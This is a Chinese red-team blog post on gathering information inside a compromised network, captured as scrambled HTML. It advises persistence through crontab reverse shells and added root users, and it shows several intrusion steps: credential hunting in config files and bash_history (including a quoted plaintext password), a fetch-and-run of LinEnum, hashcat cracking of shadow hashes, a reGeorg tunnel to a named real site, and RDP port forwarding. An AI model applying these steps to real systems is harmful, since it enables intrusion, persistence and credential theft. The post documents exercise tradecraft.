+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 reGeorgSocksProxy.py &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 9999 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 0.0.0.0 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://www.pgyer.com/tunnel.nosocket.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;内网穿透就是针对一个机器下的某一个特定端口，通过流量转发的形式把端口暴露在公网上，举个例子，我们拿下了一个linux机器，很巧这个机器是运维机器，我们发现了大量的运维账号密码。
+又然后，发现windows的远程登录服务即3389端口，所以我们在这个时候可以使用端口服务转发的技巧，把端口流量转发到一个我们可控公网的端口上（如33890），那么我们在对我们自己可控公网的端口上进行数据请求的时候，就是在对这个windows机器的数据请求，所以我们可以很轻松的使用我们的到的账号和密码来连接对应的windows机器。&lt;/p&gt;
+
+&lt;p&gt;所以我们做内网穿透的最终目的，很显然是：
+我们在已知某个内网服务器的敏感信息（如3389远程连接账号密码、3306连接账号密码），而我们在内网又无法使用windows机器远程连接、mysql-client软件对我们所得到的信息进行明确验证时，那么这个时候我们可以使用内网穿透即流量转发的手段来进行进一步验证。&lt;/p&gt;
+
+&lt;h3 id=&quot;1x04内网信息搜集技巧&quot;&gt;1x04：内网信息搜集技巧&lt;/h3&gt;
+&lt;h4 id=&quot;-nmap&quot;&gt;# nmap&lt;/h4&gt;
+&lt;p&gt;由此拿到web服务器的权限后，msf死活都连不上，就无法进行内网扫描，查资料后可以：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;跳板机（非root权限）本地编译安装nmap：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://nmap.org/dist/nmap-7.40.tar.bz2
+bzip2 &lt;span class=&quot;nt&quot;&gt;-cd&lt;/span&gt; nmap-7.40.tar.bz2 | &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvf -
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;nmap-7.40
+./configure
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
+make &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class=&quot;nb&quot;&gt;install
+&lt;/span&gt;noohup ./nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 192.168.0.0/24 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cobalt Strike 插件扫描&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;二典型案例剖析&quot;&gt;二：典型案例剖析&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Elastic Search
+    &lt;ul&gt;
+      &lt;li&gt;RCE&lt;/li&gt;
+      &lt;li&gt;敏感信息&lt;/li&gt;
+      &lt;li&gt;nday…&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Zabbix
+    &lt;ul&gt;
+      &lt;li&gt;弱口令&lt;/li&gt;
+      &lt;li&gt;SQL注入&lt;/li&gt;
+      &lt;li&gt;nday…&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;ActiveMQ
+    &lt;ul&gt;
+      &lt;li&gt;basic认证弱口令&lt;/li&gt;
+      &lt;li&gt;ActiveMQ 反序列化漏洞（CVE-2015-5254）&lt;/li&gt;
+      &lt;li&gt;PUT &amp;amp; MOVE方法写入shell&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Hystrix
+    &lt;ul&gt;
+      &lt;li&gt;ssrf
+        &lt;ul&gt;
+          &lt;li&gt;http://ip:6855/proxy.stream?origin=http://www.baidu.com&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;redis
+    &lt;ul&gt;
+      &lt;li&gt;未授权写入crontab计划&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;shiro
+    &lt;ul&gt;
+      &lt;li&gt;shiro550 &amp;amp; 721 rememberMe反序列化&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;struts2
+    &lt;ul&gt;
+      &lt;li&gt;s2-{01-61}&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;…
+其实总结下来内网里有很多可以利用的，还是要具体问题具体分析才能更好的在内网“遨游”。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;总结下来，内网的信息收集需要的是细心。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://apt404.github.io/2016/06/26/atived-machine-discovnery/&quot;&gt;如何在目标内网中发现更多存活主机 [Arp,icmp,tcp/udp,smb,snmp …]&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;以上。&lt;/p&gt;
+
+                &lt;!-- [x] 2022/10/20/10:49:36 fixed: while width &lt; some inch. would be flex column not display like a row.--&gt;
+&lt;footer&gt;
+	&lt;style&gt;.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}&lt;/style&gt;
+	&lt;div class=&quot;border-top&quot;&gt;&lt;/div&gt;
+		&lt;section class=&quot;container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto&quot;&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/blog/2020/inside-internet-walk-through/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
+						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
+					&lt;div&gt;&lt;a href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-user&quot;&gt;&lt;/div&gt;
+						Post by Bin4xin.&lt;/a&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-06-08-inside-internet-walk-through.markdown&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+						贡献当前开源文档
+					&lt;/a&gt;
+					&lt;p class=&quot;f0_8-l mt-2 text-bold&quot;&gt;此之前，学习开源贡献&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码&quot;&gt;CN&amp;nbsp;|&lt;/a&gt;
+						&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/github/docs/blob/main/CONTRIBUTING.md&quot;&gt;EN&lt;/a&gt;&lt;/p&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;此文档对您有帮助吗&lt;/h2&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/&quot; target=&quot;_blank&quot; class=&quot;no-underline&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;给文档仓库点个赞!&quot;&gt;
+					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/blog/2020-06-08-inside-internet-walk-through.markdown&amp;nbsp; 「信息搜集」:漫谈一些在内网的信息搜集技巧 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
+				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+			&lt;/div&gt;
+		&lt;/section&gt;
+&lt;/footer&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;&lt;!--/col-lg-8 --&gt;
+        
+&lt;div class=&quot;ml-hide article-index thin-scrollbar position-sticky top-0&quot; style=&quot;max-height: 100vh; overflow-y: auto;&quot;&gt;
+    &lt;div class=&quot;nav nav-stacked tableOfContents_35-E&quot;&gt;
+        &lt;li class=&quot; table-of-contents&quot;&gt;
+            &lt;code-index-css&gt;
+                &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+                &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#零在机器上的信息搜集&quot;&gt;零：在机器上的信息搜集&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x01个人工作机器信息搜集&quot;&gt;0x01：个人工作机器信息搜集&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x02web服务器信息搜集&quot;&gt;0x02：WEB服务器信息搜集&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#-配置文件&quot;&gt;# 配置文件&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#-bash_history&quot;&gt;# bash_history&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#-一些自动化搜集脚本&quot;&gt;# 一些自动化搜集脚本&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#-passwdshadow不推荐&quot;&gt;# Passwd&amp;amp;Shadow（不推荐）&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#0x03运维机器信息搜集&quot;&gt;0x03：运维机器信息搜集&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#一局域网里的信息搜集&quot;&gt;一：局域网里的信息搜集&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#1x01跳板机攻击&quot;&gt;1x01：跳板机攻击&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#1x02内网代理&quot;&gt;1x02：内网代理&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#1x03内网穿透&quot;&gt;1x03：内网穿透&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#1x04内网信息搜集技巧&quot;&gt;1x04：内网信息搜集技巧&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#-nmap&quot;&gt;# nmap&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#二典型案例剖析&quot;&gt;二：典型案例剖析&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#总结&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#参考&quot;&gt;参考&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+            &lt;/code-index-css&gt;
+        &lt;/li&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+    &lt;/div&gt;&lt;!--/row --&gt;
+&lt;/div&gt;&lt;!--/container --&gt;哨兵安全实验室 SENTINEL SECURITY, LAB" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2020/inside-internet-walk-through/" />
+<title> 「信息搜集」:漫谈一些在内网的信息搜集技巧 | © 哨兵 | SENTINEL SECURITY, LAB</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+                <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <!-- logo+popover整体包裹，便于布局和交互 -->
+            <div class="navbar-logo-hover-wrap">
+                <a class="gb_A flex-justify-center-l navbar-logo" href="/" title="返回首页" tabindex="0" aria-label="返回首页">
+                    <picture>
+  <svg style="vertical-align: middle;" aria-hidden="true" focusable="false" role="img" class="color-fg-default" viewBox="0 0 16 16" width="42" height="42" fill="currentColor" style=""><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+  
+</picture>
+                </a>
+                <!-- Apple/GitHub 风格美化的 popover -->
+                <div class="navbar-logo-popover" tabindex="-1">
+                    <div class="popover-arrow"></div>
+                    <ul>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <li>
+                                <a class="popover-link" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">
+                                    <span class="fa fa-code-fork"></span>
+                                    <span class="popover-link-text">BIGGER THAN BIGGER</span>
+                                </a>
+                            </li>
+                            
+                            <li>
+                                <a class="popover-link" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">
+                                    <span class="fa fa-code-fork"></span>
+                                    <span class="popover-link-text">COLLECTION OF VERIFIED VULNERABILITIES</span>
+                                </a>
+                            </li>
+                            
+                            <li>
+                                <a class="popover-link" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">
+                                    <span class="fa fa-code-fork"></span>
+                                    <span class="popover-link-text">SWEET-YSOSERIAL</span>
+                                </a>
+                            </li>
+                            
+                        
+                    
+                        
+                    
+                        
+                    
+                        
+                    
+                        
+                    
+                    </ul>
+                </div>
+            </div>
+            <!-- 菜单按钮 -->
+            <button type="button" class="navbar-toggle" id="navbar-toggle-btn" data-toggle="collapse" data-target=".navbar-collapse" aria-label="切换导航菜单" aria-expanded="false" aria-controls="main-nav" style="outline:2px solid transparent; margin-left: 8px;">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/"><div class="fa fa-search"></div></a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/newest">NEWEST</a></li>
+                <li ><a href="/about/">RESEARCH</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+<script>
+// 菜单展开/收起交互优化，支持键盘操作
+(function() {
+    var btn = document.getElementById('navbar-toggle-btn');
+    var nav = document.querySelector('.navbar-collapse');
+    if (!btn || !nav) return;
+    btn.addEventListener('click', function() {
+        var expanded = btn.getAttribute('aria-expanded') === 'true';
+        btn.setAttribute('aria-expanded', !expanded);
+        nav.classList.toggle('show');
+    });
+    btn.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+            btn.click();
+            e.preventDefault();
+        }
+    });
+})();
+</script>
+
+                <div class="container mtb">
+    <div class="row d-flex ">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img flex-column">
+            <!-- Blog Post  -->
+            <a href="/blog/2020/inside-internet-walk-through/"><h1 class="ctitle">「信息搜集」:漫谈一些在内网的信息搜集技巧</h1></a>
+            <csmall><div class="d-flex items-center">
+                <!--article author end-->
+
+<!-- site build time set to the latest time.-->
+
+<!-- post time-->
+
+
+
+
+
+<div class="ml-hide">
+    <a class="f2 d-flex color-fg-default" href="https://github.com/Bin4xin" target="_blank">
+        Bin4xin
+
+        
+            
+            <!-- wrench time-->
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Mar 19, 2021
+        
+    </a>
+</div>
+            </div></csmall>
+            <div class="post-content"> 
+            <p>经历过几次HW行动，每次HW都运气较好可以拿到服务器，于是每次公司的内网渗透的任务就交给我，记录一下对于内网的信息搜集过程，以及在此过程中我自己所积累的小技巧。</p>
+
+<hr />
+<p><strong>2021年 3月19日 星期五 16时37分27秒 CST</strong>更新</p>
+<ul>
+  <li>重构了部分小结的展示：
+    <ul>
+      <li>重新调整了文章的阐述框架，尽可能从实战角度出发，进行章节安排；</li>
+      <li>尽量使得前后小结更加紧凑，阐述逻辑更加清晰。</li>
+    </ul>
+  </li>
+  <li>加入了尽可能多的markdown语法，文章结构清晰的同时，让页面更加赏心悦目。</li>
+</ul>
+
+<blockquote>
+  <p>写在文前：</p>
+
+  <p>年后回来就一直在肝代码，肝的快失去信心了；正好三月中旬有场全国范围的攻防演练，就来重新拾起信心～演练结束再肝代码再失去信心，循环往复=。=</p>
+
+  <p>本文着重从实战角度作为切入点，从获取的跳板机为入口进行阐述，基本的逻辑为：</p>
+
+  <p>跳板机-&gt;内网代理-&gt;信息搜集-&gt;漏洞挖掘与利用</p>
+</blockquote>
+
+<p>我们从攻击者的角度来看，拿到一个跳板机的权限后首先是对跳板机所在的区域进行路由划分，我们可以通过这样的思路来判断获得内网中搜集到的信息是否利于我们进一步渗透，同时我们在此过程中也需要小心谨慎，攻防演练中我所遇到的基本上都是生产环境，在和开发、运维人员博弈的过程中要做到：
+<strong>悄悄地来、悄悄的走</strong></p>
+
+<p>废话不多说，文笔较菜，文章权当抛砖引玉，回到正题。</p>
+<h2 id="零在机器上的信息搜集">零：在机器上的信息搜集</h2>
+
+<blockquote>
+  <p>渗透的本质就是信息搜集</p>
+</blockquote>
+
+<h3 id="0x01个人工作机器信息搜集">0x01：个人工作机器信息搜集</h3>
+<p>这方面我本人了解的不是很多，一般来说是通过钓鱼邮件的形式获取的WINDOWS PC权限，可以参考我另一篇从网上的搬运过来的文章：</p>
+
+<ul>
+  <li><a href="https://juejin.cn/post/6881208971915444231#heading-3">个人机器信息收集</a></li>
+</ul>
+
+<h3 id="0x02web服务器信息搜集">0x02：WEB服务器信息搜集</h3>
+<p>一般建议可以以root用户新建用户来维持权限，或者是写入<code class="language-plaintext highlighter-rouge">corntab</code>计划来定时反弹shell。实操中几乎很少有运维、开发去检查定时计划的反弹shell脚本，所以基本上可以满足后持续渗透的条件。</p>
+<h4 id="-配置文件"># 配置文件</h4>
+
+<ul>
+  <li>数据库配置信息
+通过mybatis等配置文件就可以拿到内网中对应的数据库机器，一般都是低权限，运气好可以拿到高权限。运气再好一点存在高权限的mssql数据库可以尝试连接一下尝试<code class="language-plaintext highlighter-rouge">xp_cmd_shell</code>来执行命令。</li>
+</ul>
+
+<p>我们通过web层面拿到的机器，一般都是web服务器，即存在各种jar包，所以服务器里会存放大量配置文件</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在当前目录下搜索存在字符为<span class="s1">'mysql'</span>的文件
+<span class="nb">grep</span> <span class="nt">-rn</span> <span class="s2">"mysql"</span> <span class="nb">.</span>
+<span class="o">=======</span>
+查看对应系统的敏感配置文件
+<span class="nb">cat </span>static/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php
+<span class="o">=======</span>
+curl ifconfig.me
+120.25.13.49
+</code></pre></div></div>
+<p>通过进程任务可以查找到部署jar包的目录和相对应依赖，大部分运维和开发都习惯于在根目录下新建data目录或者是非系统文件夹下的目录存在web的依赖jar包，我们就可以从这点做突破口。查看一下端口开放情况和对应的目录位置，有一些shell的基础就可以搜集到这些信息。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="nt">-ef</span>|grep java
+
+netstat <span class="nt">-ANTUP</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>有的时候拿到的机器或多或少存在一些特殊情况，比如docker机器、单纯的一个数据库机器，那么就尽力而为去做一些搜集工作，特别是docker机器，除了跑的服务，机器里面太干净了，基本没有什么可以利用的地方。</strong></p>
+</blockquote>
+
+<h4 id="-bash_history"># bash_history</h4>
+
+<p>命令执行历史文件一般建议必看，里面会存着一些意想不到的内容，下面截取一小部分我在内网实战中发现的惊喜：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>nexus-3.12.0-01
+ll
+<span class="nb">cd </span>bin/
+./nexus start
+pactera@575
+<span class="nb">cd </span>domain/
+ll
+<span class="nb">cd </span>nexus3/
+</code></pre></div></div>
+<p>注意<code class="language-plaintext highlighter-rouge">./nexus start</code>和<code class="language-plaintext highlighter-rouge">cd domain/</code>两条命令中间的那个“命令”，对，没错那个是sudoer用户的密码，su切换直接就拥有root权限。我们分析一下为什么出现这样的现象：个人认为是在运行nexus程序是需要密码来提升权限，然后输入者在等待过程中没有发现输入密码的shell还没有回显出来就输入了密码，从而导致密码被系统当作执行命令记录进了history文件。</p>
+
+<hr />
+<p><strong>发现这个后，我第一时间去看了自己服务器和自己的mac本上的历史文件，搜索机器密码关键词，同时也存在这样的现象明文密码存在了里面</strong></p>
+
+<p><strong>醍醐灌顶</strong></p>
+<h4 id="-一些自动化搜集脚本"># 一些自动化搜集脚本</h4>
+
+<ul>
+  <li>LinEnum.sh
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-o</span> /tmp/linenum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+<span class="nb">chmod</span> +X /tmp/linenum.sh <span class="o">&amp;&amp;</span> bash /tmp/linenum.sh
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h4 id="-passwdshadow不推荐"># Passwd&amp;Shadow（不推荐）</h4>
+
+<p>一般来说通过<code class="language-plaintext highlighter-rouge">shiro</code>和<code class="language-plaintext highlighter-rouge">struts2</code>拿到的shell基本都是root，很多人都会直接去读取passwd文件，其实并不可取。下面展示一下2核4G服务器跑hash文件的过程。一般是跑不出来的，哈希不可逆，除非存在彩虹表，一般都跑不出来。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1800 <span class="nt">-a</span> 0 <span class="nt">-o</span> found.txt linux-root.txt /usr/share/john/password.lst <span class="nt">--force</span>
+hashcat <span class="o">(</span>v4.0.1<span class="o">)</span> starting...
+
+OpenCL Platform <span class="c">#1: The pocl project</span>
+<span class="o">====================================</span>
+<span class="k">*</span> Device <span class="c">#1: pthread-Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz, 256/738 MB allocatable, 1MCU</span>
+
+Hashes: 2 digests<span class="p">;</span> 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Uses-64-Bit
+
+Password length minimum: 0
+Password length maximum: 256
+
+ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> OpenCL kernels selected.
+This enables cracking passwords and salts <span class="o">&gt;</span> length 32 but <span class="k">for </span>the price of drastical reduced performance.
+If you want to switch to optimized OpenCL kernels, append <span class="nt">-O</span> to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
